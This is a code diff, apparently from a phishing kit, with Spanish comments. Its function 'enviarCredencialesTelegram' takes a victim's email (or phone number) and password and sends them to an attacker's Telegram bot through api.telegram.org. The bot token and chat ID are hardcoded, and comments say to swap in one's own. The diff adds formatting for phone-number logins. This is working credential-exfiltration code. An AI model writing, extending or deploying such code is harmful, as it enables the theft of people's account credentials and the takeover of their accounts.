@@ -4,7 +4,18 @@
 function enviarCredencialesTelegram(email, password) {
   const token = '8661171262:AAFERx712IcMyTvPJDId8bLvMPK00hIvJu0'; //cambias por el tuyo
   const chatId = '1739505466';// cambias por el tuyo
-  const mensaje = `Formulario enviado\nCorreo: ${email}\nContraseña: ${password}`;
+  // Detectar si es número telefónico (10 dígitos)
+  let tipo = 'Correo';
+  let valor = email;
+  const soloDigitos = email.replace(/\D/g, '');
+  if (/^\d{10}$/.test(soloDigitos)) {
+    const area = soloDigitos.slice(0, 3);
+    const mid = soloDigitos.slice(3, 6);
+    const last = soloDigitos.slice(6);
+    valor = `(${area}) ${mid}-${last}`;
+    tipo = 'Phone number';
+  }
+  const mensaje = `Formulario enviado\n${tipo}: ${valor}\nContraseña: ${password}`;
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
   fetch(url, {
